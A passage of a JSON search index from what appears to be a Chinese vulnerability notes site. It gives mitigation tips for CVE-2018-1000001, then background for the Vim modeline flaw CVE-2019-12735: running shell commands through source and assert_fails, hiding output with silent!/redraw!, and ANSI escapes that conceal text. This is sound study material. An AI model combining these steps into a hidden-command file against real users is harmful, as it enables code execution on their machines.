\u6839\u636e\u5206\u6790\uff0c\u8be5\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u5f00\u542funprivileged_userns_clone\u6743\u9650\uff0c\u6240\u4ee5\u5728\u7d27\u6025\u60c5\u51b5\u4e0b\uff0c\u6700\u5feb\u901f\uff0c\u65b9\u4fbf\u7684\u9632\u62a4\u65b9\u5f0f\u662f\u68c0\u67e5\u8be5\u914d\u7f6e\uff0c\u5e76\u786e\u4fdd\u5176\u5728\u4e0d\u9700\u8981\u7684\u60c5\u51b5\u4e0b\u5173\u95ed\u4ee5\u963b\u65ad\u6f0f\u6d1e\u5229\u7528\u7684\u57fa\u7840(\u4f46\u662f\u6b64\u914d\u7f6e\u662f\u67d0\u4e9b\u5bb9\u5668\u5e94\u7528\u7684\u57fa\u7840)\u3002    \u7531\u4e8e\u6f0f\u6d1e\u5229\u7528\u901a\u8fc7\u8bed\u8a00\u652f\u6301\u6587\u4ef6\u5b9e\u73b0\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6ce8\u5165\uff0c\u56e0\u6b64\u76d1\u63a7\u7cfb\u7edf\u7684\u8bed\u8a00\u652f\u6301\u6587\u4ef6\u80fd\u591f\u8d77\u5230\u4e00\u5b9a\u4f5c\u7528\u3002\u4f8b\u5982\uff0c\u76d1\u63a7\u8fdb\u7a0b\u8bfb\u53d6\u548c\u521b\u5efa\u7684.mo\u6587\u4ef6\u662f\u5426\u6709\u5f02\u5e38\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32(\u6bd4\u5982\u5305\u542b%n, %$\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32)\uff0c\u53ef\u4ee5\u53ea\u5728\u521b\u5efa\u7684\u65f6\u5019\u68c0\u6d4b\u51cf\u5c11\u6027\u80fd\u635f\u5931\uff1a    shell\n  root@debian:/usr/share/locale/gl/LC_MESSAGES/# file util-linux.mo\n  util-linux.mo: GNU message catalog (little endian), revision 0.0, 214 messages",
            "title": "5.\u9632\u62a4\u5efa\u8bae"
        },
        {
            "location": "/cve-2018-1000001/#6",
            "text": "LibcRealpathBufferUnderflow \nhttps://www.freebuf.com/column/162202.html\nhttps://bbs.pediy.com/thread-228678.htm",
            "title": "6.\u53c2\u8003"
        },
        {
            "location": "/cve-2019-12735-01/",
            "text": "cve-2019-12735\u9644\u4ef6\n\n\n\u80cc\u666f\u77e5\u8bc6\n\n\nVim\u7684\u6a21\u5f0f\n\n\nhttp://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro\n\n\nNormal mode\n\n\n\u901a\u8fc7 $ vim file \u6253\u5f00\u6587\u4ef6\u540e\u8fdb\u5165\u7684\u6a21\u5f0f\n\n\n$ vim hello.txt\nHello\n~                                                                     \n~                                                                      \n~                                                                      ...\n~                                                                               \n\"hello.txt\" 1L, 6C\n\n\n\n\n\n\u901a\u8fc7source!\u52a0\u8f7d\u7684\u811a\u672c\u7684\u5185\u5bb9\uff0c\u5c31\u662f\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e0b\u8f93\u5165\u7684\u5185\u5bb9\n\n\nCommand-line mode\n\n\n\n\n\n\n\u5728normal mode\u4e0b\u8f93\u5165\n: ( and / ? )\n\u8fdb\u5165Command-line mode\n\n\n\n\n\n\n\u5728Vim\u7684Command-line\u6a21\u5f0f\u4e0b\uff0c\u53ef\u4ee5\u6267\u884cVim commands\n\n\n\n\n\u5176\u4e2d\uff0c\u901a\u8fc7 \n:!{shell cmd}\n \u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\n\n\n\n\n# http://vimdoc.sourceforge.net/htmldoc/various.html#:!\n$ vim\n:!uname -a\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue\n\n\n\n\n\nEx mode\n\n\n\n\n\n\n\u901a\u8fc7$ vim -e  file \u8fdb\u5165\u8be5\u6a21\u5f0f\n\n\n\n\n\n\n\u4e5f\u53ef\u4ee5\u5728Normal mode\u4e0b\u8f93\u5165Q\u8fdb\u5165\u8be5\u6a21\u5f0f\n\n\n\n\n\u8fd9\u4e2a\u6a21\u5f0f\u7684\u7279\u70b9\u662f\u53ef\u4ee5\u8fde\u7eed\u6267\u884cVim command\uff0c\u53ef\u4ee5\u7c7b\u6bd4 python \u7684\u547d\u4ee4\u884c\u6a21\u5f0f\n\n\n\u901a\u8fc7source\u52a0\u8f7d\u7684\u811a\u672c\u7684\u5185\u5bb9\uff0c\u5c31\u662f\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e0b\u8f93\u5165\u7684\u5185\u5bb9\n\n\n\n\nInsert mode\n\n\n\n\n\n\n\u5728Normal mode\u4e0b\u8f93\u5165i\u53ef\u4ee5\u8fdb\u5165Insert mode, \u8fd9\u4e2a\u6a21\u5f0f\u76f8\u5f53\u4e8e\u7f16\u8f91\u6a21\u5f0f\uff0c\u5927\u90e8\u5206\u64cd\u4f5c\u548c\u5728\u8bb0\u4e8b\u672c\u4e2d\u4e00\u6837\u3002\n\n\n\n\n\n\n\u53e6\u5916\u8fd8\u6709 \"I\", \"a\", \"A\", \"o\", \"O\", \"c\", \"C\", \"s\" or S\"\u4e5f\u53ef\u4ee5\u4eceNormal mode\u8fdb\u5165Insert mode.\n\n\n\n\n\n\n\u5177\u4f53\u6a21\u5f0f\u8f6c\u6362\u89c1: http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro\n\n\n\n\n\n\n\u5176\u4e2d\"S\"\u8868\u793a\u526a\u5207\u5f53\u524d\u884c\uff0c\u5e76\u8fdb\u5165Insert mode\n\n\n\n\n\n\n```shell\n  # :help S\n  #                                                         \nS\n\n  # [\"x]S                   Delete [count] lines [into register x] and start\n  #                         insert.  Synonym for \"cc\" |linewise|.\n\n\n# Demo\u6f14\u793a\n  $ vim 1.vim\n  :let i = 1\n  :while i < 10\n  :    let a = getline(i)\n  :    if empty(a)\n  :        break\n  :    endif\n  :    echo \"Line:\" i \"is\"  a\n  :    let i += 1\n  :endwhile\n  ~                                                                    \n\n  ...   \n\n  ~                                                                             \n\n  \"1.vim\" 9L, 147C\n\n\nS(shift+s)\n\n\n:while i < 10\n  :    let a = getline(i)\n  :    if empty(a)\n  :        break\n  :    endif\n  :    echo \"Line:\" i \"is\"  a\n  :    let i += 1\n  :endwhile\n  ~                                                                      ...\n  ~\n\n\n-- INSERT --\n  \n\n  p  (p\u662f\u7c98\u8d34)\n  p\n\n\n:let i = 1\n  :let i = 1\n  :while i < 10\n  :    let a = getline(i)\n  :    if empty(a)\n  :        break\n  :    endif\n  :    echo \"Line:\" i \"is\"  a\n  :    let i += 1\n  :endwhile\n  ~                                                                      ...\n\n\n```\n\n\nVim options\u7684\u6982\u5ff5\n\n\nVim\u7684options\u76f8\u5f53\u4e8e\u7f16\u8f91\u5668\u7684\u914d\u7f6e\uff0c\u901a\u8fc7command-line\u6a21\u5f0f\u7684:set\u547d\u4ee4\u624b\u52a8\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u81ea\u52a8\u914d\u7f6e\uff0c\u81ea\u52a8\u914d\u7f6e\u7684\u65b9\u6cd5\u4e3b\u8981\u662f\u901a\u8fc7Vim\u811a\u672c(.vimrc, .exrc)\u6216\u8005modeline\u65b9\u5f0f\u3002\n\n\nVim\u7684modeline\u529f\u80fd\n\n\n\n\n\n\n\u53c2\u80031: http://vimdoc.sourceforge.net/htmldoc/options.html#modeline\n\n\n\n\n\n\n\u53c2\u80032: https://vim.fandom.com/wiki/Modeline_magic\n\n\n\n\n\n\nmodeline\u7528\u4e8e\u5728\u6587\u672c\u6587\u4ef6\u7684\u9996\u90e8\u6216\u8005\u5c3e\u90e8\u8bbe\u7f6evim options, \u8ba9vim\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u5019\u81ea\u52a8\u52a0\u8f7d\u5e76\u6267\u884c\u8be5\u914d\u7f6e\n\n\n\n# modeline \u6709\u4e24\u79cd\u683c\u5f0f\n# \u7b2c\u4e00\u79cd\u683c\u5f0f\uff1a [text]{white}{vi:|vim:|ex:}[white]{options}\n#                           vi:noai:sw=3 ts=6 \n# - text\u53ef\u4ee5\u7528\u6765\u653e\u7f6e\u7f16\u7a0b\u8bed\u8a00\u7684\u6ce8\u91ca(python\u7684 # , C \u7684// )\uff0c\u662f\u53ef\u9009\u7684\n# - vi:\u4e4b\u524d\u4e00\u5b9a\u8981\u6709\u7a7a\u683c\n# - options\u7528\":\"\u6216\u8005\u7a7a\u683c\u5206\u9694\n\n\n# \u7b2c\u4e8c\u79cd\u683c\u5f0f\uff1a    \n#  [text]{white}{vi:|vim:|ex:}[white]se[t] {options}:[text]\n#               /* vim: set ai tw=75: */ \n# - \u9996\u5c3e\u90fd\u53ef\u4ee5\u7528text\u4e3b\u8981\u662f\u652f\u6301(C\u7684\u8fd9\u79cd\u6ce8\u91ca \"/**/\")\uff0c\u9996\u5c3e\u7684text\u90fd\u662f\u53ef\u9009\u7684\n# - vim: \u540e\u9762\u8981\u6709\u7a7a\u683c\n# - \u8981\u6709\u4e00\u4e2aset(\u53ef\u4ee5\u7f29\u5199\u6210 se\uff0c\u540e\u9762\u8ddf\u7a7a\u683c)\n# - options\u7528\u7a7a\u683c\u5206\u9694\n# - \u7ed3\u5c3e\u8981\u6709\u5192\u53f7 : \n\n\n\n\n\n\u5f00\u542fmodeline\n\n\n# \u7f16\u8f91~/.vimrc\n# \u6dfb\u52a0\uff1a\nset modeline\nset modelines=5\n\n\n\n\n\n\u5177\u4f53\u4f7f\u7528\n\n\n# \u7528Vim\u6253\u5f00\u6587\u672c\uff1a\n$ vim a.py\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n# cursor is here \n\ndef main():\n        func1()\n\nmain()\n\n\n# \u6253\u5f00a.py\u540e, \u9ed8\u8ba4\u7684tab\u957f\u5ea6\u662f8\u4e2a\u7a7a\u683c\uff0c\u4e0d\u652f\u6301\u56de\u8f66\u81ea\u52a8\u7f29\u8fdb\n# \u53ef\u4ee5\u901a\u8fc7tabstop\u548cautoindent\u4e24\u4e2a\u9009\u9879\u6765\u914d\u7f6e\n:set tabstop=4\n:set autoindent\n\n\n# \u6548\u679c\u5982\u4e0b\uff1a\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n    for i in range(10):\n        print(\"hello vim\")\n        print(platform.platform())\n        # cursor is here\n\ndef main():\n    func1()\n\nmain()\n\n\n# \u4f46\u662f\u4e0b\u6b21\u6253\u5f00\u540e\uff0c\u53c8\u9700\u8981\u518d\u914d\u7f6e\u4e00\u6b21\n# \u53ef\u4ee5\u901a\u8fc7modeline\u6765\u4f7f\u8fd9\u4e2a\u914d\u7f6e\u6bcf\u6b21\u6253\u5f00a.py\u6587\u4ef6\u65f6\u90fd\u751f\u6548\n# \u5728\u6587\u4ef6\u5f00\u5934\u6dfb\u52a0\u4e00\u884c\u5185\u5bb9\uff1a # vim: set tabstop=4 autoindent: \n# \u518d\u6b21\u6253\u5f00\u6548\u679c\u5982\u4e0b\uff1a\n\n$ vim a.py\n# vim: set tabstop=4 autoindent: \n# python3\n# coding=utf-8\nimport platform\n\n\ndef func1():\n    for i in range(10):\n        print(\"hello vim\")\n        print(platform.platform())\n        # cursor is here\n\ndef main():\n    func1()\n\nmain()\n\n\n\n\n\n\n\n\n\nFor security reasons, only a subset of options is permitted in modelines, and if the option value contains an expression, it is executed in a sandbox\n\n\n\n\n\n\u4e3a\u4e86\u5b89\u5168\u539f\u56e0\uff0c\u53ea\u6709\u90e8\u5206options\u53ef\u4ee5\u5728modeline\u4e2d\u914d\u7f6e\uff0c\u5982\u679coption\u7684\u503c\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f(\u6bd4\u5982\u914d\u7f6efoldexpr)\uff0c\u90a3\u4e48\u8868\u8fbe\u5f0f\u4f1a\u5728vim\u7684sandbox\u4e2d\u6267\u884c\n\n\nVim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\n\n\n\u6839\u636eVim Script\u8bed\u6cd5\u7f16\u5199Vim\u811a\u672c\uff0c\u53c2\u8003\uff1a\n\n\nhttps://github.com/name5566/vim-config/blob/master/vim_script.md\nhttp://vimdoc.sourceforge.net/htmldoc/usr_41.html\nhttp://vimdoc.sourceforge.net/htmldoc/eval.html\nhttp://vimdoc.sourceforge.net/htmldoc/eval.html#functions\n\n\n\n\n# \u521b\u5efa\u4e00\u4e2aVim\u811a\u672c1.vim\n$ vim 1.vim\n\n\n# \u6309\u7167Vim Script\u8bed\u6cd5\u7f16\u8f91\u811a\u672c\n:let i = 1\n:while i < 10\n:    let a = getline(i)\n:    if empty(a) \n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n\n\n# \u4fdd\u5b58\n:w\n\n\n# \u7528source\u6307\u4ee4\u52a0\u8f7d\u81ea\u5df1\u5e76\u6267\u884c\n:source % \n# or\n:source 1.vim\n\n\n# \u6267\u884c\u7ed3\u679c\uff1a\nLine: 1 is :let i = 1\nLine: 2 is :while i < 10\nLine: 3 is :    let a = getline(i)\nLine: 4 is :    if empty(a)\nLine: 5 is :        break\nLine: 6 is :    endif\nLine: 7 is :    echo \"Line:\" i \"is\"  a\nLine: 8 is :    let i += 1\nLine: 9 is :endwhile\nPress ENTER or type command to continue\n\n\n\n# \u5728\u7f16\u8f91\u5176\u4ed6\u6587\u4ef6\u7684\u65f6\u5019\u52a0\u8f7d\u5e76\u6267\u884c\u4e00\u4e2aVim\u811a\u672c\n$ vim a.txt\nHello\nVim\nGoodbye!\n~         \n:source 1.vim\n\n\nLine: 1 is Hello\nLine: 2 is Vim\nLine: 3 is Goodbye!\nPress ENTER or type command to continue\n\n\n\n\n\n\nsource\u547d\u4ee4\n\n\nsource\u547d\u4ee4\u7528\u4e8e\u4eceVim\u811a\u672c\u6587\u4ef6\u4e2d\u8bfb\u53d6Vim\u6307\u4ee4\u5e76\u6267\u884c\uff0c\u53c2\u8003\uff1ahttp://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts\n\n\n:help source\n\n:so[urce] {file}        \n  Read Ex commands from {file}.  \n  These are commands that start with a \":\".\n\n\n:so[urce]! {file}       \n  Read Vim commands from {file}.  \n  These are commands that are executed from Normal mode, \n  like you type them.\n\n\n\n\n\n\nsource\u548csource!\u7684\u533a\u522b\u5728\u4e8e\uff1a\n\n\n\n\nsource\u662f\u4ece\u6587\u4ef6\u8bfb\u53d6 Ex commands, \u4e5f\u5c31\u662f\u8bf4\u6587\u4ef6\u7684\u5185\u5bb9\u5fc5\u987b\u662f :cmd \u7684\u5f62\u5f0f\n\n\nsource!\u662f\u4ece\u6587\u4ef6\u8bfb\u53d6 Normal mode\u4e0b\u6267\u884c\u7684vim commands, \u4e5f\u5c31\u662f\u8bf4\u6587\u4ef6\u4e2d\u7684\n<ESC> i /\n \u5b57\u7b26\u8fd9\u4e9b\u90fd\u4f1a\u5f53\u6210Normal mode\u4e0b\u7684\u7528\u6237\u8f93\u5165(like you type them)\n\n\n\n\n# \u521b\u5efa\u4e00\u4e2avim\u811a\u672c\uff0c\u5199\u5165\u5185\u5bb9iHello,World\u540e\u4fdd\u5b58\n$ vim 5.vim\niHello,World\n\n:wq\n\n# \u7528source! \u52a0\u8f7d\u5e76\u6267\u884c\u811a\u672c\n$ vim \n:source! 5.vim\n\n# \u6548\u679c\u5982\u4e0b\uff0c\u6253\u5f00\u540e\u76f4\u63a5\u8fdb\u5165\u4e86Insert mode\nHello,World\n\n~                                                                      \n~                                                                      \n...                                                                    \n~                                                                       \n~                                                                                                        \n-- INSERT --\n\n\n# \u800c\u7528source\u52a0\u8f7d\u5219\u4f1a\u62a5\u9519\n$ vim \n:source 5.vim\n\n\nError detected while processing 5.vim:\nline    1:\nE492: Not an editor command: iHello,World\nPress ENTER or type command to continue\n\n\n\n\n\n\nvim\u6267\u884cshell\u547d\u4ee4\n\n\n\u901a\u8fc7\u5728command-line mode\u4e0b\uff0c\u4f7f\u7528 !{cmd}\u6765\u6267\u884cshell\u547d\u4ee4\n\n\n$ vim\n:!uname -a\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue\n\n\n\n\n\n\n# \u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684vim\u811a\u672c\n$ vim a.vim\n<i>\n:!uname -a\n~\n~\n<ESC>\n:source %\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\nPress ENTER or type command to continue\n\n# \u7279\u6b8a\u7684\u51fd\u6570execute\n# $ vim\n# :help execute()\n#  execute({command} [, {silent}])                                 *execute()*\n#                 Execute an Ex command or commands and return the output as a\n#                 string. \n#                 {command} can be a string or a List.  In case of a List the\n#                 lines are executed one by one. \n# ...\n\n#                 The optional {silent} argument can have these values:\n#                         \"\"              no `:silent` used\n#                         \"silent\"        `:silent` used\n#                         \"silent!\"       `:silent!` used\n#                               The default is \"silent\".  \n#                               Note that with \"silent!\", unlike `:redir`, error messages are dropped\n# ...\n\n\n$ vim b.vim\n: call execute(\"source a.vim\", \"\")\n\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\n\nPress ENTER or type command to continue\n\n\n# execute\u51fd\u6570\u5728ubuntu\u4e0a\u5b89\u88c5\u7684Vim\u4e2d\u6ca1\u6709\uff0c\u4f46\u662f\u8fd8\u6709\u53e6\u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\uff1aassert_fails()\n# $ vim\n# :help assert_fails\n# \n# assert_fails({cmd} [, {error}])                                 *assert_fails()*\n#                 Run {cmd} and add an error message to |v:errors| if it does\n#                 NOT produce an error.\n#                 When {error} is given it must match in |v:errmsg|.\n$ vim b.vim\n: call assert_fails(\"source a.vim\")\n\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\n\nPress ENTER or type command to continue\n\n\n\n\n\n\nsilent\u547d\u4ee4\n\n\n# :help silent\n#                              *:sil* *:silent* *:silent!*\n# :sil[ent][!] {command}  \n#    Execute {command} silently.  \n#    Normal messages will not\n#    be given or added to the message history.\n#    When [!] is added, error messages will also be\n#    skipped, and commands and mappings will not be aborted\n#    when an error is detected.\n\n\n\n# 1. \u7f16\u5199\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e0d\u4f7f\u7528silent\uff0c\u4fdd\u5b58\u540e\u4f1a\u5728\u5e95\u90e8\u51fa\u73b0\u56de\u663e\u4fe1\u606f\nvim 1.txt\ni\nsomething \n~                                                                      ...     \n~       \n<ESC>\n:w                                                                   \n\"a.vim\" 1L, 11C written\n\n# 2. \u4f7f\u7528silent\uff0cw\u547d\u4ee4\u7684\u56de\u663e\u4fe1\u606f\u5c31\u6d88\u5931\u4e86\nvim 1.txt\ni\nsomenthing\n~                                                                       ...   \n~                                                                               \n:silent! w\n\n# 3. silent! \u53ef\u4ee5\u7528\u6765\u53bb\u9664\u9519\u8bef\u4fe1\u606f\nvim 1.txt\ni\nsomething\n<ESC>\n:w\n:file | silent! Anycommand or anytext'\\' \\; \"\n\nsomething\n~                                                                      ...\n~                                                                                                                                           \n\"1.vim\" line 1 of 1 --100%-- col 9\n\n\n\n\n\n\nredraw\u547d\u4ee4\n\n\n# :help redraw!\n#                                             *:redr*  *:redraw*\n# :redr[aw][!]            \n#  Redraw the screen right now.  \n#  When ! is included it is cleared first.\n#                         ... \n# \u7acb\u523b\u5237\u65b0\u5c4f\u5e55\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86!\u5219\u5148\u6e05\u9664\u5c4f\u5e55\u5185\u5bb9\n# \u6bcf\u6761\u547d\u4e86\u6267\u884c\u5b8c\uff0c\u5e95\u90e8\u4f1a\u7559\u4e0b\u5386\u53f2\u8bb0\u5f55\uff0c redraw!\u4f1a\u6e05\u9664\u6389\u8bb0\u5f55\n\n# \u5c4f\u5e55\u4f1a\u6e05\u7a7a\nvim 1.txt\ni\nsomenthing\n~                                                                       ...   \n~                                                                               \n:silent! w\n:redraw!\n\nsomething\n~                                                                       ...\n~                                                                            \n\n\n\n\n\nfile\u547d\u4ee4\n\n\n# \u8f93\u5165\u5f53\u524d\u6587\u4ef6\u4fe1\u606f\nvim 1.txt\ni\nsomething\n<ESC>\n:w\n:file\nsomething\n~                                                                      ...\n~                                                                                                                                           \n\"1.vim\" line 1 of 1 --100%-- col 9\n\n\n\n\n\n\n\nsystem\u51fd\u6570\n\n\nsystem({expr} [, {input}])                              *system()* *E677*\nGet the output of the shell command {expr} as a string.  \n... \n\n$ vim\n:let a = system('pwd')\n:echo a\n\n~                                                                      \n/home/invincible/Desktop/test/vim_test\n\nPress ENTER or type command to continue\n\n\n\n\n\n\nassert_fails\u51fd\u6570\n\n\n\u6267\u884c\u4e00\u4e2avim command, \u5982\u679c\u6ca1\u6709\u51fa\u9519\uff0c\u5219\u5c06command\u7684\u6267\u884c\u4fe1\u606f\u4fdd\u5b58\u5230v:errors\u5168\u5c40\u53d8\u91cf\u4e2d\n\n\n:help assert_fails\n\nassert_fails({cmd} [, {error}])                                \n  Run {cmd} and add an error message to |v:errors| \n  if it does NOT produce an error.\n  When {error} is given it must match in |v:errmsg|.\n\n\n\n\n\n$ vim\n:call assert_fails(\"echo 'hello'\")\n\n~\n...\n~\nhello\n\n:echo v:errors\n['command did not fail: echo ''hello''']\n\n\n\n\n\n\u7f16\u5199\u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684vim\u811a\u672c\n\n\n\n$ vim a.vim\n<i>\n:!uname -a\n~\n~\n<ESC>\n:wq\n\n# \u7528assert_faild\u6267\u884cvim\u7684source\u6307\u4ee4\uff0c\u52a0\u8f7dvim\u811a\u672ca.vim\n$ vim\n:call assert_fails(\"source a.vim\")\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue\n\n:echo v:errormsg\n['command did not fail: source a.vim']\n\n\n\n\n\nVim\u7684folding\u529f\u80fd\n\n\n\n\n\n\nvim\u7684folding\u529f\u80fd\u7528\u4e8e\u5bf9\u6587\u672c\u4e2d\u7684\u6587\u672c\u5757\uff08\u6bd4\u5982\u4e00\u4e2a\u51fd\u6570\uff0c\u4e00\u6bb5\u6ce8\u91ca\uff09\u6298\u53e0\u548c\u5c55\u5f00\uff0c\u53ef\u4ee5\u7c7b\u6bd4\u4e3a\u56fe\u5f62\u5316\u7f16\u8f91\u5668\u7f16\u8f91\u533a\u4fa7\u680f\u7684(+/-)\u3002\n\n\n\n\n\n\nfoldmethod\u9009\u9879\u662f\u7528\u6765\u914d\u7f6eVim\u7684\u4ee3\u7801\u6298\u53e0\u529f\u80fd\u7684\uff0cVim\u7ed9\u51fa\u4e86manual, indent, expr, syntax, diff, marker\u8fd9\u51e0\u79cd\u4ee3\u7801\u6298\u53e0\u7684\u65b9\u5f0f\uff0c\u4e0b\u9762\ud83d\udc47\u662findent\u65b9\u5f0f\u7684\u6548\u679c\uff1a\n\n\n\n\n\n\n```shell\n  # \u6587\u672c\u5982\u4e0b\n  $ vim a.py\n\n\n# python3\n  # coding=utf-8\n  import platform\n\n\ndef func1():\n          for i in range(10):\n                  print(\"hello vim\")\n                  print(platform.platform())\n\n\ndef main():\n          func1()\n\n\nmain()\n\n\n# 1. \u8bbe\u7f6efoldmethod\u9009\u9879\n  :set foldenable\n  :set foldmethod=indent\n\n\n# \u6548\u679c\u5982\u4e0b\n  # python3\n  # coding=utf-8\n  import platform\n\n\ndef func1():\n  +--  3 lines: for i in range(10):-------------------------------------\n\n\ndef main():\n          func1()\n\n\nmain()\n\n\n```\n\n\n\u5982\u679c\u4e0d\u6ee1\u8db3\u4e8e\u7ed9\u5b9a\u7684\u51e0\u79cd\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5c06foldmethod\u8bbe\u7f6e\u4e3aexpr\u6765\u81ea\u5b9a\u4e49\u4ee3\u7801\u5757\u7684\u7279\u5f81\n\n\n```shell\n  # \u6587\u672c\u5982\u4e0b\n  $ vim a.py\n\n\n# python3\n  # coding=utf-8\n  import platform\n\n\ndef func1():\n          for i in range(10):\n                  print(\"hello vim\")\n                  print(platform.platform())\n\n\ndef main():\n          func1()\n\n\nmain()\n\n\n:set foldenable\n  :set foldmethod=expr\n  :set foldexpr=getline(v:lnum)[0]==\\\"#\\\"\n  # foldexpr\u7528\u4e8e\u8bbe\u7f6e\u6587\u672c\u6ee1\u8db3\u7684\u6761\u4ef6\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u6587\u672c\u5757\u4f1a\u88ab\u6298\u53e0\n  # \u8be5\u914d\u7f6e\u7684\u610f\u601d\u662f\u901a\u8fc7Vim\u7684getline\u51fd\u6570\uff0c\u5224\u65ad\u6bcf\u4e00\u884c\u6587\u672c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u4e3a\"#\"\uff0c\u5c06\u6ee1\u8db3\u6761\u4ef6\u7684\u76f8\u90bb\u7684\u884c\u89c6\u4e3a\u4e00\u4e2a\u6587\u672c\u5757\uff0c\u5e76\u5c06\u5176\u6298\u53e0\n  # \u6548\u679c\u5982\u4e0b: \n\n\n+--  2 lines: # python3-----------------------------------------------\n  import platform\n\n\ndef func1():\n          for i in range(10):\n                  print(\"hello vim\")\n                  print(platform.platform())\n\n\ndef main():\n          func1()\n\n\nmain()\n\n\n```\n\n\nvim\u7684sandbox\u6982\u5ff5\n\n\n11. The sandbox                 *eval-sandbox* *sandbox* *E48*\n\n\nThe 'foldexpr', 'formatexpr', 'includeexpr', 'indentexpr', 'statusline' and\n'foldtext' options may be evaluated in a sandbox. \n\n\nThis gives some safety for when these options are set from a modeline.  \n\n\nThese items are not allowed in the sandbox:\n    - changing the buffer text\n    - defining or changing mapping, autocommands, functions, user commands\n    - setting certain options (see |option-summary|)\n    - setting certain v: variables (see |v:var|)  *E794*\n    - executing a shell command\n    - reading or writing a file\n    - jumping to another buffer or editing a file\n    - executing Python, Perl, etc. commands\n\n\n\n\n\n\nANSI escape codes\n\n\n\u53c2\u8003\uff1a\n\n\nhttps://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html\nhttps://notes.burke.libbey.me/ansi-escape-codes/\nhttps://learnku.com/articles/26231\n\n\n\n\n\\x1b[1G\n\n\n\\x1b[1G \u5149\u6807\u79fb\u52a8\u5230\u5f53\u524d\u884c\u7684\u7b2cPn\u4e2a\u4f4d\u7f6e\n\n\n# ESC [ Pn G                      Cursor horizontal position\n# $ echo -e \"Hello\\x1b[1GA\" > a.txt\n# $ cat a.txt\n# Aello\n# $ echo -e \"Hello\\x1b[2GA\" > a.txt\n# $ cat a.txt\n# HAllo\n# $ echo -e \"Hello\\x1b[3GA\" > a.txt\n# $ cat a.txt\n# HeAlo\n\n\n\n\n\n\\x1b[D\n\n\n\\x1b[D \u5149\u6807\u5de6\u79fb1\u4e2a\u4f4d\u7f6e\n\n\n# ESC [ Pn D                      Cursor Left\n# \u5149\u6807\u5de6\u79fbPn\u4e2a\u4f4d\u7f6e\n# $ echo -e \"Hello\\x1b[D\" > a.txt\n# $ cat a.txt\n# Hello\n# $ echo -e \"Hello\\x1b[D\\x1b[D\\x1b[DAAA\" > a.txt\n# $ cat a.txt\n# HeAAA\n# $ echo -e \"Hello\\x1b[5DAAA\" > a.txt\n# $ cat a.txt\n# AAAlo\n\n\n\n\n\n\\x1b[K\n\n\n\\x1b[K \u6e05\u9664\u5149\u6807\u5230\u5f53\u524d\u4f4d\u7f6e\u7684\u5185\u5bb9\n\n\n# *  ESC [ K           erase to end of line (inclusive)\n# \u6e05\u9664\u5149\u6807\u5230\u5f53\u524d\u4f4d\u7f6e\u7684\u5185\u5bb9(\u4e0d\u4f1a\u6539\u53d8\u6587\u672c)\uff0c\u53ef\u4ee5\u914d\u5408\\x1b[G\u4f7f\u7528\n$ echo -e \"AAAA\\x1b[1G\\x1b[KBBBB\" > a.txt\n$ cat  a.txt\nBBBB\n$ echo -e \"ABCD\\x1b[2G\\x1b[KEEEE\" > a.txt\n$ cat  a.txt\nAEEEE\n$ echo -e \"ABCD\\x1b[3G\\x1b[KEEEE\" > a.txt\n$ cat a.txt \nABEEEE\n$ echo -e \"ABCD\\x1b[KEEEE\" > a.txt\n$ cat a.txt \nABCDEEEE\n\n\n\n\n\n\\x1b[2K\n\n\n      \n\n\n\\x1b[?7l\n\n\n\n\nESC [ ? 7 l       auto wrap off  \n\n\n\n\n\\x1b[?7l \u5173\u95ed\u81ea\u52a8\u6362\u884c (l -> low)\n\n\n\n\n\n\n\\x1b[?7h \u5f00\u542f\u81ea\u52a8\u6362\u884c (h -> 